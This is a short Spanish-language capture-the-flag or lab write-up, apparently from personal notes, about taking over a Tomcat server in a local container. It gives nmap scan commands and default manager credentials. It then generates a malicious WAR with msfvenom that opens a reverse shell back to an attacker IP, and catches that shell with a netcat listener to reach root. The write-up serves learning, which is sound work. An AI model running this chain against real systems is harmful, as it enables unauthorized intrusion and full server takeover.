tags: #tomcat  #reverse-shell #file-upload #facil 
_______________________________
## Reconocimiento

Comenzamos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:
```bash
nmap -sS -p- 172.17.0.2 -oN ports
```

Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:

![Pasted image 20251007152154](../../../Anexos/Pasted%20image%2020251007152154.png)

```bash
nmap -sCV -p2080,21 172.17.0.2 -oN versions
```

![Pasted image 20251007163747](../../../Anexos/Pasted%20image%2020251007163747.png)

A pesar de que el anon-ftp está activado, solo podemos acceder a un archivo que no contiene nada. Decidimos por tanto entrar a la web por el navegador:

![Pasted image 20251007163947](../../../Anexos/Pasted%20image%2020251007163947.png)

Al acceder al apartado de Manager App, y cerrarlo, nos lleva a una página de error donde nos dan unas credenciales por defecto:
```bash
user: tomcat
password: s3cr3t
```

![Pasted image 20251007163852](../../../Anexos/Pasted%20image%2020251007163852.png)

Ahora, una vez en el panel de administrador, encontramos un apartado que nos permite subir archivo .war, así que creamos uno malicioso con msfvenom, utilizando el siguiente comando:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.20.10.3 LPORT=443 -f war -o RevShell5.war
```

![Pasted image 20251007164232](../../../Anexos/Pasted%20image%2020251007164232.png)

Ahora, en nuestra máquina de atacante nos ponemos en escucha en netcat por el puerto 443, esperando una conexión remota:
```bash
nc -lvnp 443
```

Al subir el archivo al servidor, se ejecuta el comando y recibimos una reverse shell en nuestra máquina atacante, que al ejecutar el comando whoami, podemos comprobar que ya somos root:

![Pasted image 20251007164510](../../../Anexos/Pasted%20image%2020251007164510.png)
